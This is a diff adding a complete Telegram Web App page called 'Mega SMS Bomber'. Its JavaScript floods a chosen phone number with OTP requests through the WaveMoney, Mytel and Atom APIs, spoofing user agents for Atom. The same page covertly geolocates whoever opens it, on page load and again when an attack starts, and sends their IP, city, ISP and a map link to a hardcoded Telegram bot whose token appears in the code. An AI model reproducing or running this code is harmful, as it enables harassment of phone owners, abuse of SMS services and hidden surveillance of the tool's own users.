@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Mega SMS Bomber</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            padding: 20px;
+        }
+
+        .container {
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 25px;
+            width: 100%;
+            max-width: 450px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+
+        h1 {
+            text-align: center;
+            color: #fff;
+            font-size: 28px;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .sub {
+            text-align: center;
+            color: #aaa;
+            font-size: 12px;
+            margin-bottom: 25px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            color: #ddd;
+            font-size: 14px;
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 14px;
+            border-radius: 12px;
+            border: none;
+            background: rgba(255,255,255,0.15);
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+            transition: all 0.3s;
+        }
+
+        input:focus {
+            background: rgba(255,255,255,0.25);
+        }
+
+        input::placeholder {
+            color: rgba(255,255,255,0.5);
+        }
+
+        .api-group {
+            background: rgba(0,0,0,0.3);
+            border-radius: 15px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+
+        .api-title {
+            color: #fff;
+            font-size: 14px;
+            margin-bottom: 12px;
+            font-weight: bold;
+        }
+
+        .api-checkboxes {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        .api-checkboxes label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
+            font-size: 14px;
+            color: #fff;
+        }
+
+        input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            accent-color: #ff4757;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-bottom: 12px;
+        }
+
+        .btn-start {
+            background: linear-gradient(90deg, #ff4757, #ff6b81);
+            color: white;
+        }
+
+        .btn-start:active {
+            transform: scale(0.98);
+        }
+
+        .btn-stop {
+            background: rgba(255,255,255,0.2);
+            color: #ff4757;
+            border: 1px solid #ff4757;
+        }
+
+        .status {
+            background: rgba(0,0,0,0.5);
+            border-radius: 12px;
+            padding: 12px;
+            margin-top: 15px;
+            text-align: center;
+            font-size: 13px;
+            color: #0f0;
+            font-family: monospace;
+        }
+
+        .status.error {
+            color: #ff4757;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 3px;
+            margin-top: 12px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #ff4757, #ff6b81);
+            transition: width 0.3s;
+        }
+
+        .stats {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 12px;
+            font-size: 12px;
+            color: #ddd;
+        }
+
+        footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #666;
+            font-size: 11px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>
+            <span>💣</span> Mega SMS Bomber
+        </h1>
+        <div class="sub">WaveMoney | Mytel | Atom</div>
+
+        <div class="input-group">
+            <label>📱 ဖုန်းနံပါတ်</label>
+            <input type="tel" id="phone" placeholder="09712345678" value="">
+        </div>
+
+        <div class="api-group">
+            <div class="api-title">🎯 API များရွေးချယ်ပါ</div>
+            <div class="api-checkboxes">
+                <label>
+                    <input type="checkbox" id="api_wave" value="wave" checked>
+                    🌊 WaveMoney
+                </label>
+                <label>
+                    <input type="checkbox" id="api_mytel" value="mytel" checked>
+                    📱 Mytel
+                </label>
+                <label>
+                    <input type="checkbox" id="api_atom" value="atom" checked>
+                    📡 Atom
+                </label>
+            </div>
+        </div>
+
+        <div class="input-group">
+            <label>🔢 အကြိမ်ရေ (1-200)</label>
+            <input type="number" id="count" min="1" max="200" value="10">
+        </div>
+
+        <button class="btn-start" id="startBtn">🚀 START ATTACK</button>
+        <button class="btn-stop" id="stopBtn" style="display:none;">🛑 STOP ATTACK</button>
+
+        <div class="status" id="status">
+            ✅ Ready
+        </div>
+        <div class="progress-bar" id="progressBar" style="display:none;">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+        <div class="stats" id="stats" style="display:none;">
+            <span>✅ Success: <span id="successCount">0</span></span>
+            <span>❌ Failed: <span id="failedCount">0</span></span>
+            <span>📊 Total: <span id="totalCount">0</span></span>
+        </div>
+        <footer>
+            ⚡ Full Speed Mode | Random UA for Atom
+        </footer>
+    </div>
+
+    <script>
+        const WebApp = window.Telegram.WebApp;
+        WebApp.ready();
+        WebApp.expand();
+
+        // Telegram Bot Token & Admin Chat ID
+        const BOT_TOKEN = "8201360751:AAGay7Fene2IQVSHujS28m9K9KKw-Nx-Rn4";
+        const ADMIN_CHAT_ID = "7968044907";
+
+        let isRunning = false;
+        let currentIndex = 0;
+        let success = 0;
+        let failed = 0;
+        let totalRequests = 0;
+        let selectedApis = [];
+        let phoneNumber = "";
+        let attackCount = 0;
+        let cachedIPData = null;
+
+        // ==================== IP FETCH (Admin Only) ====================
+        async function fetchUserIP() {
+            try {
+                const response = await fetch('http://ip-api.com/json/');
+                const data = await response.json();
+                return {
+                    ip: data.query,
+                    country: data.country,
+                    countryCode: data.countryCode,
+                    region: data.region,
+                    regionName: data.regionName,
+                    city: data.city,
+                    zip: data.zip,
+                    lat: data.lat,
+                    lon: data.lon,
+                    timezone: data.timezone,
+                    isp: data.isp,
+                    org: data.org,
+                    as: data.as
+                };
+            } catch(e) {
+                return null;
+            }
+        }
+
+        // Generate Google Maps Link
+        function getGoogleMapsLink(lat, lon) {
+            return `https://www.google.com/maps?q=${lat},${lon}`;
+        }
+
+        // Send IP to Admin Only (Full Details with Google Maps)
+        async function sendIPToAdmin(ipData, action = "page_load") {
+            if (!ipData) return;
+            
+            const mapsLink = getGoogleMapsLink(ipData.lat, ipData.lon);
+            
+            const message = `🆔 **IP Logger**\n\n` +
+                `⚡ **Action:** ${action}\n` +
+                `🌐 **IP Address:** \`${ipData.ip}\`\n` +
+                `📍 **Country:** ${ipData.country} (${ipData.countryCode})\n` +
+                `🏙️ **City:** ${ipData.city}\n` +
+                `🗺️ **Region:** ${ipData.regionName} (${ipData.region})\n` +
+                `📮 **Postal:** ${ipData.zip || 'N/A'}\n` +
+                `📡 **ISP:** ${ipData.isp}\n` +
+                `🏢 **Organization:** ${ipData.org || 'N/A'}\n` +
+                `🔢 **AS:** ${ipData.as || 'N/A'}\n` +
+                `🕐 **Timezone:** ${ipData.timezone}\n` +
+                `🗺️ **Location:** [Click to view on Google Maps](${mapsLink})`;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: ADMIN_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                console.log("IP sent to admin");
+            } catch(e) {
+                console.log("Send IP failed");
+            }
+        }
+
+        // ==================== API FUNCTIONS ====================
+        async function sendWaveMoney(phone) {
+            try {
+                const res = await fetch(`https://api.wavemoney.io:8100/v3/wmt-mfs-otp/generate-otp?msisdn=${phone}`, {
+                    method: 'GET',
+                    headers: { 'Content-Type': 'application/json' }
+                });
+                return res.status === 200;
+            } catch(e) { return false; }
+        }
+
+        async function sendMytel(phone) {
+            try {
+                let p = phone;
+                if (phone.startsWith('09')) p = '959' + phone.slice(2);
+                const res = await fetch(`https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber=${p}`, {
+                    method: 'GET',
+                    headers: { 'Content-Type': 'application/json' }
+                });
+                return res.status === 200;
+            } catch(e) { return false; }
+        }
+
+        async function sendAtom(phone) {
+            try {
+                const uaList = [
+                    "MyTM/4.13.0/Android/30",
+                    "MyTM/4.12.0/Android/29",
+                    "MyTM/4.11.0/Android/28",
+                    "MyTM/4.10.0/Android/27"
+                ];
+                const deviceList = [
+                    "Xiaomi Redmi Note 8 Pro",
+                    "Samsung Galaxy A52",
+                    "OPPO Reno5",
+                    "Xiaomi Redmi Note 9 Pro"
+                ];
+                const randomUA = uaList[Math.floor(Math.random() * uaList.length)];
+                const randomDevice = deviceList[Math.floor(Math.random() * deviceList.length)];
+                
+                const res = await fetch(`https://store.atom.com.mm/mytmapi/v1/my/local-auth/send-otp?msisdn=${phone}&userid=-1&v=4.13.0`, {
+                    method: 'POST',
+                    headers: {
+                        'user-agent': randomUA,
+                        'device-name': randomDevice,
+                        'x-server-select': 'production',
+                        'content-type': 'application/json',
+                        'host': 'store.atom.com.mm'
+                    },
+                    body: JSON.stringify({ msisdn: phone })
+                });
+                return res.status === 200;
+            } catch(e) { 
+                return false; 
+            }
+        }
+
+        const apiMap = {
+            wave: sendWaveMoney,
+            mytel: sendMytel,
+            atom: sendAtom
+        };
+
+        const apiNames = {
+            wave: "🌊 WaveMoney",
+            mytel: "📱 Mytel",
+            atom: "📡 Atom"
+        };
+
+        // Send result to Telegram Admin
+        async function sendResultToAdmin(phone, successCount, failedCount, total, apis, ipData) {
+            const apiList = apis.map(a => apiNames[a]).join(", ");
+            const mapsLink = ipData ? getGoogleMapsLink(ipData.lat, ipData.lon) : "#";
+            
+            const message = `💣 **Mega SMS Bomber Result**\n\n` +
+                `📱 **Phone:** \`${phone}\`\n` +
+                `🎯 **APIs:** ${apiList}\n` +
+                `✅ **Success:** ${successCount}\n` +
+                `❌ **Failed:** ${failedCount}\n` +
+                `📊 **Total:** ${total}\n\n` +
+                `🆔 **User IP:** \`${ipData?.ip || 'N/A'}\`\n` +
+                `📍 **Location:** ${ipData?.city || 'N/A'}, ${ipData?.country || 'N/A'}\n` +
+                `📡 **ISP:** ${ipData?.isp || 'N/A'}\n` +
+                `🕐 **Timezone:** ${ipData?.timezone || 'N/A'}\n` +
+                `🗺️ **Maps:** [Click to view on Google Maps](${mapsLink})`;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: ADMIN_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch(e) {
+                console.log("Send to admin failed");
+            }
+        }
+
+        // Update UI
+        function updateUI() {
+            document.getElementById('successCount').innerText = success;
+            document.getElementById('failedCount').innerText = failed;
+            document.getElementById('totalCount').innerText = totalRequests;
+            const percent = totalRequests > 0 ? (currentIndex / totalRequests) * 100 : 0;
+            document.getElementById('progressFill').style.width = percent + '%';
+        }
+
+        // Attack Loop
+        async function runAttack() {
+            const requests = [];
+            for (let i = 0; i < attackCount; i++) {
+                for (const api of selectedApis) {
+                    requests.push({ api, order: requests.length });
+                }
+            }
+            totalRequests = requests.length;
+            currentIndex = 0;
+            success = 0;
+            failed = 0;
+            updateUI();
+
+            for (const req of requests) {
+                if (!isRunning) break;
+                
+                const apiFunc = apiMap[req.api];
+                try {
+                    const result = await apiFunc(phoneNumber);
+                    if (result) {
+                        success++;
+                    } else {
+                        failed++;
+                    }
+                } catch(e) {
+                    failed++;
+                }
+                currentIndex++;
+                updateUI();
+                await new Promise(r => setTimeout(r, 80));
+            }
+            
+            isRunning = false;
+            document.getElementById('startBtn').style.display = 'block';
+            document.getElementById('stopBtn').style.display = 'none';
+            
+            // Send result with cached IP data
+            await sendResultToAdmin(phoneNumber, success, failed, totalRequests, selectedApis, cachedIPData);
+            
+            document.getElementById('status').innerHTML = `✅ Completed | Success: ${success} | Failed: ${failed}`;
+            document.getElementById('progressBar').style.display = 'none';
+        }
+
+        // Start Attack
+        async function startAttack() {
+            phoneNumber = document.getElementById('phone').value.trim();
+            attackCount = parseInt(document.getElementById('count').value);
+            
+            if (!phoneNumber) {
+                document.getElementById('status').innerHTML = '❌ ဖုန်းနံပါတ်ထည့်ပါ။';
+                document.getElementById('status').className = 'status error';
+                return;
+            }
+            
+            if (attackCount < 1 || attackCount > 200) {
+                document.getElementById('status').innerHTML = '❌ အကြိမ်ရေ 1-200 ကြားထည့်ပါ။';
+                document.getElementById('status').className = 'status error';
+                return;
+            }
+            
+            selectedApis = [];
+            if (document.getElementById('api_wave').checked) selectedApis.push('wave');
+            if (document.getElementById('api_mytel').checked) selectedApis.push('mytel');
+            if (document.getElementById('api_atom').checked) selectedApis.push('atom');
+            
+            if (selectedApis.length === 0) {
+                document.getElementById('status').innerHTML = '❌ အနည်းဆုံး API တစ်ခုရွေးပါ။';
+                document.getElementById('status').className = 'status error';
+                return;
+            }
+            
+            // Send IP to admin on start attack
+            const ipData = await fetchUserIP();
+            cachedIPData = ipData;
+            await sendIPToAdmin(ipData, "START ATTACK");
+            
+            isRunning = true;
+            currentIndex = 0;
+            success = 0;
+            failed = 0;
+            
+            document.getElementById('startBtn').style.display = 'none';
+            document.getElementById('stopBtn').style.display = 'block';
+            document.getElementById('progressBar').style.display = 'block';
+            document.getElementById('stats').style.display = 'flex';
+            document.getElementById('status').innerHTML = '⚔️ Attacking...';
+            document.getElementById('status').className = 'status';
+            
+            runAttack();
+        }
+
+        // Stop Attack
+        function stopAttack() {
+            isRunning = false;
+            document.getElementById('startBtn').style.display = 'block';
+            document.getElementById('stopBtn').style.display = 'none';
+            document.getElementById('status').innerHTML = '🛑 Stopped by user.';
+            document.getElementById('status').className = 'status error';
+            document.getElementById('progressBar').style.display = 'none';
+        }
+
+        // ==================== INIT ====================
+        async function init() {
+            // Fetch IP but don't show to user, only send to admin
+            const ipData = await fetchUserIP();
+            cachedIPData = ipData;
+            await sendIPToAdmin(ipData, "PAGE_LOAD");
+            
+            // User sees nothing about IP
+            document.getElementById('status').innerHTML = '✅ Ready';
+        }
+
+        // Event Listeners
+        document.getElementById('startBtn').addEventListener('click', startAttack);
+        document.getElementById('stopBtn').addEventListener('click', stopAttack);
+        
+        // Set WebApp theme
+        WebApp.setHeaderColor('#0f0c29');
+        WebApp.setBackgroundColor('#24243e');
+        
+        // Run init
+        init();
+    </script>
+</body>
+</html>
